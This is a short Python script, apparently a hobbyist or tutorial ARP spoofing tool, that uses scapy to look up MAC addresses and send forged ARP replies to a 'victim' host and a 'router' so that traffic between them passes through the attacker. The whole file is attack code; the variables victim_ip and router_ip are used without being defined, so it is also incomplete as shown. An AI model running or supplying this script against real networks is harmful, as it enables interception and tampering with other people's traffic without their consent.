#!/usr/bin/env python
import scapy.all as scapy

def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broad_req = broadcast/arp_req
    live = scapy.srp(arp_broad_req, timeout=1, verbose=False)[0]
    return live[0][1].hwsrc
def arpsend(target_ip, target_addr, src_ip):
    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_addr, psrc=src_ip)
    scapy.send(arp_packet)


victim_addr = get_mac(victim_ip)
router_addr = get_mac(router_ip)
arpsend(victim_ip, victim_addr, router_ip)
arpsend(router_ip, router_addr, victim_ip)